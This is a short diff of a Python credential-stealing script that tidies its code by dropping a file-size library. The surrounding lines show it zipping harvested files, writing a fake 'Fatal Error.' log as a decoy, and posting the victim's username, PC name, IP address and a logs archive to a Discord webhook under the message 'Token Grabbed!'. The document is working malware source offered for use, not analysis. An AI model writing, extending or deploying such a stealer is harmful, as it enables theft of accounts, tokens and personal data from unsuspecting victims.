@@ -10,7 +10,6 @@ import sys
 import shutil
 import zipfile
 from requests import get
-from hurry.filesize import size,alternative
 from dhooks import Webhook, File
 
 hook = Webhook('WEBHOOK HERE')
@@ -79,14 +78,13 @@ else:
   chromeinst = False
 zip.close()
 
-zipfilesize = size(os.path.getsize(zipf),system=alternative)
 if int(os.path.getsize(zipf)) > 8388608:
   filetoobig = True
 def main():
   with open (temp_dir+"run.log", 'w+') as handle:
     handle.write("Fatal Error.")
     handle.close()
-  hook.send('```css\nToken Grabbed! \n\nUsername: '+str(user) + '\nPC Name: ' + pc_name + '\nIP Address: {}'.format(ip) + '\n\nZip File size: '+ str(zipfilesize)+'\n\nZip File:```')
+  hook.send('```css\nToken Grabbed! \n\nUsername: '+str(user) + '\nPC Name: ' + pc_name + '\nIP Address: {}'.format(ip) +'\n\nZip File:```')
   try:
     hook.send(file = File(zipf, name=str(user)+" Logs.zip"))
   except:
